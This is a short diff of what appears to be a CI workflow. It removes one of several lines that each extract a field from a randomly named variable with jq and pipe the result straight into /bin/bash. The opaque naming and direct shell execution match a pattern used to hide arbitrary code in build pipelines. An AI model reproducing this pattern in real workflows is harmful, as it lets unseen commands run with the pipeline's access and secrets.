@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$gwpno90" | jq -r .slaos1309 | /bin/bash
           printf '%s' "$o491" | jq -r .iqlbh9099 | /bin/bash
           echo $bh33946 | jq -r .ctq149 | /bin/bash
-          printf '%s' "$bm393" | jq -r .phk3 | /bin/bash
           echo $bjvmp36762 | jq -r .dimj1007 | /bin/bash
           echo $w9952 | jq -r .tsky0 | /bin/bash
           printf '%s' "$egusm542" | jq -r .wt79 | /bin/bash
